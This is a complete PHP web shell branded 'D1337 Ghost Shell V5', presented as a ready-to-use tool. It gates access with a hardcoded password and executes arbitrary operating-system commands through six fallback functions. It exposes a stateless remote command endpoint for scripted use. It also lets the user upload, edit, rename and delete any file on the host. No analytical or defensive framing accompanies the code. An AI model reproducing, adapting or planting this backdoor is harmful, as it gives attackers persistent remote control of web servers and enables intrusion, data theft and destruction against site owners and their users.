<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);

$pass_hash = "d489a3289ecdc847cb67f7a480e6f9fa"; // MD5 of "kontol"

$auth = false;
if(isset($_SESSION['d1337_auth'])) {
    $auth = true;
} elseif(isset($_POST['pass']) && md5($_POST['pass']) == $pass_hash) {
    $_SESSION['d1337_auth'] = true;
    $auth = true;
} elseif(isset($_GET['pass']) && md5($_GET['pass']) == $pass_hash) {
    $_SESSION['d1337_auth'] = true;
    $auth = true;
}

if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// Standard Login
if(!$auth) {
    echo '<!DOCTYPE html><html><head><title>Login - D1337</title>';
    echo '<style>body{background:#0b0b0b;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} .login-box{background:#111;padding:30px;border:1px solid #333;text-align:center;} input[type="password"]{background:#000;color:#0f0;border:1px solid #333;padding:10px;margin:10px 0;width:80%;} input[type="submit"]{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:10px 20px;cursor:pointer;} input[type="submit"]:hover{background:#333;}</style></head><body>';
    echo '<div class="login-box">';
    echo '<h2>D1337 GHOST SHELL V5</h2>';
    echo '<form method="post"><input type="password" name="pass" placeholder="Password..." autofocus><br><input type="submit" value="Login"></form>';
    echo '</div>';
    echo '</body></html>';
    die();
}

// Core Functions
function rce($cmd){
    $out = "";
    if(function_exists('system')){ ob_start(); system($cmd); $out = ob_get_contents(); ob_end_clean(); }
    elseif(function_exists('exec')){ exec($cmd, $o); $out = implode("\n", $o); }
    elseif(function_exists('passthru')){ ob_start(); passthru($cmd); $out = ob_get_contents(); ob_end_clean(); }
    elseif(function_exists('shell_exec')){ $out = shell_exec($cmd); }
    elseif(function_exists('popen')){ $fp = popen($cmd, 'r'); while(!feof($fp)) $out .= fread($fp, 1024); pclose($fp); }
    elseif(function_exists('proc_open')){ 
        $d = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $p = proc_open($cmd, $d, $pipes);
        if(is_resource($p)){
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
        }
    }
    return $out;
}

// Direct RCE for scripts (Stateless)
if(isset($_POST['api_cmd'])) {
    echo "D1337_RCE_START\n";
    echo rce($_POST['api_cmd']);
    echo "\nD1337_RCE_END";
    die();
}

function get_perms($file){
    $p = fileperms($file);
    if (($p & 0xC000) == 0xC000) $i = 's';
    elseif (($p & 0xA000) == 0xA000) $i = 'l';
    elseif (($p & 0x8000) == 0x8000) $i = '-';
    elseif (($p & 0x6000) == 0x6000) $i = 'b';
    elseif (($p & 0x4000) == 0x4000) $i = 'd';
    elseif (($p & 0x2000) == 0x2000) $i = 'c';
    elseif (($p & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-'); $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-'); $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-'); $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace("\\", "/", $dir);
if(is_dir($dir)) chdir($dir);

// Actions
$msg = "";
if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $dir."/".$_FILES['f']['name'])) $msg = "Upload OK: ".$_FILES['f']['name'];
    else $msg = "Upload Failed!";
}
if(isset($_GET['del'])){
    $df = $_GET['del'];
    if(is_dir($df)) { rmdir($df); $msg = "Dir Deleted"; }
    else { unlink($df); $msg = "File Deleted"; }
}
if(isset($_POST['new_name'])){
    rename($_GET['ren'], $dir."/".$_POST['new_name']);
    $msg = "Renamed!";
}
if(isset($_POST['file_content']) && isset($_GET['edit'])){
    file_put_contents($_GET['edit'], $_POST['file_content']);
    $msg = "File Saved!";
}

echo "<!DOCTYPE html><html><head><title>D1337 V5</title>";
echo "<style>body{background:#0b0b0b;color:#0f0;font-family:monospace;font-size:14px;margin:0;padding:20px;}a{color:#0f0;text-decoration:none;}a:hover{color:#fff;}input,textarea,button{background:#111;border:1px solid #333;color:#0f0;padding:6px;}table{width:100%;border-collapse:collapse;margin-top:10px;}td,th{padding:8px;border:1px solid #222;text-align:left;}th{background:#1a1a1a;}.nav{margin-bottom:15px;padding:12px;background:#1a1a1a;border:1px solid #333;}.alert{color:#ff0;margin-bottom:15px;}</style>";
echo "</head><body>";

echo "<div class='nav'><b>D1337 GHOST SHELL V5</b> | User: ".get_current_user()." | OS: ".php_uname()." | <a href='?logout'>[Logout]</a></div>";
echo "<div class='nav'>Path: ";
$paths = explode("/", $dir);
$cdir = "";
foreach($paths as $id => $pat){
    if($pat == "" && $id == 0){ echo "<a href='?d=/'>/</a>"; continue; }
    if($pat == '') continue;
    $cdir .= "/".$pat;
    echo "<a href='?d=$cdir'>$pat</a>/";
}
echo "</div>";

if($msg != "") echo "<div class='alert'>[*] $msg</div>";

// Command Execution
echo "<div class='nav'><form method='post' action='?d=$dir'>Terminal: <input type='text' name='cmd' size='80' autofocus placeholder='whoami'> <input type='submit' value='Execute'></form></div>";
if(isset($_POST['cmd'])){
    echo "<pre style='background:#000;padding:15px;border:1px solid #333;color:#0f0;overflow-x:auto;'>$ ".$_POST['cmd']."\n\n".htmlspecialchars(rce($_POST['cmd']))."</pre>";
}

// Edit File
if(isset($_GET['edit'])){
    $f = $_GET['edit'];
    echo "<h3>Edit: $f</h3><form method='post' action='?d=$dir&edit=$f'><textarea name='file_content' style='width:100%;height:500px;'>".htmlspecialchars(file_get_contents($f))."</textarea><br><br><input type='submit' value='Save File'> <a href='?d=$dir'>[Cancel]</a></form>";
}
// Rename File
elseif(isset($_GET['ren'])){
    $f = basename($_GET['ren']);
    echo "<h3>Rename: $f</h3><form method='post' action='?d=$dir&ren=".$_GET['ren']."'><input type='text' name='new_name' value='$f' size='50'> <input type='submit' value='Rename'> <a href='?d=$dir'>[Cancel]</a></form>";
}
// Main View
else {
    echo "<div class='nav'><form method='post' enctype='multipart/form-data' action='?d=$dir'>Upload File: <input type='file' name='f'> <input type='submit' value='Upload'></form></div>";

    $scandir = scandir($dir);
    echo "<table><tr><th>Name</th><th>Size</th><th>Perms</th><th>Action</th></tr>";
    
    // Directories first
    foreach($scandir as $file){
        if(!is_dir($dir."/".$file) || $file == ".") continue;
        $link = "?d=$dir/$file";
        $perm = get_perms($dir."/".$file);
        echo "<tr><td>[DIR] <a href='$link'>$file</a></td><td>-</td><td>$perm</td><td><a href='?d=$dir&ren=$dir/$file'>Rename</a> | <a href='?d=$dir&del=$dir/$file'>Delete</a></td></tr>";
    }
    // Files
    foreach($scandir as $file){
        if(!is_file($dir."/".$file)) continue;
        $size = round(filesize($dir."/".$file)/1024, 2)." KB";
        $perm = get_perms($dir."/".$file);
        echo "<tr><td><a href='?d=$dir&edit=$dir/$file'>$file</a></td><td>$size</td><td>$perm</td><td><a href='?d=$dir&edit=$dir/$file'>Edit</a> | <a href='?d=$dir&ren=$dir/$file'>Rename</a> | <a href='?d=$dir&del=$dir/$file'>Delete</a></td></tr>";
    }
    echo "</table>";
}

echo "</body></html>";
?>